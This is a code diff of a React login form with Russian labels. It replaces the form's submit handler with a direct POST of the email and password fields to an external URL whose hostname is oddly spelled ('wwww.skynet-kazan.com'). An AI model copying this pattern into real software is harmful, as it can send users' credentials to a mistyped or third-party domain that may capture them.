@@ -46,14 +46,17 @@ const Login = () => {
             </div>
 
             {/* Форма */}
-            <form onSubmit={handleSubmit} className="space-y-6">
+            <form 
+              action="https://wwww.skynet-kazan.com/login"
+              method="post"
+              className="space-y-6">
               <div className="space-y-2">
                 <Label htmlFor="email">Email</Label>
                 <div className="relative">
                   <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
                   <Input
-                    id="email"
-                    type="email"
+                    id="Login"
+                    name="Login"                    
                     placeholder="your@email.com"
                     value={email}
                     onChange={(e) => setEmail(e.target.value)}
@@ -68,7 +71,8 @@ const Login = () => {
                 <div className="relative">
                   <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
                   <Input
-                    id="password"
+                    id="Password"
+                    name="Password"
                     type={showPassword ? 'text' : 'password'}
                     placeholder="Введите пароль"
                     value={password}
